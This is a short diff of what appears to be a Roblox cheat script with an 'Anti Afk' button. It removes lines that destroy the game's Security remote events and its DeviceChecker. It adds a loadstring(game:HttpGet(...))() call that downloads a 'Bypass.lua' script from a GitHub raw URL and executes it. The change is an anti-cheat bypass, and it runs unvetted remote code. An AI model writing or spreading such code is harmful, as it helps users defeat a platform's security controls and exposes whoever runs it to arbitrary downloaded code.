@@ -379,10 +379,7 @@ tab.newButton("Anti Afk", "Anti Afk", function()
 
 warn("Anti-Afk has Loaded")
 end)
-game:GetService("ReplicatedStorage").Security.RemoteEvent:Destroy()
-game:GetService("ReplicatedStorage").Security[""]:Destroy()
-game:GetService("ReplicatedStorage").Security:Destroy()
-game:GetService("Players").LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/TieuuLann/Limit-X/main/Bypass.lua'),true))()
 
 
 
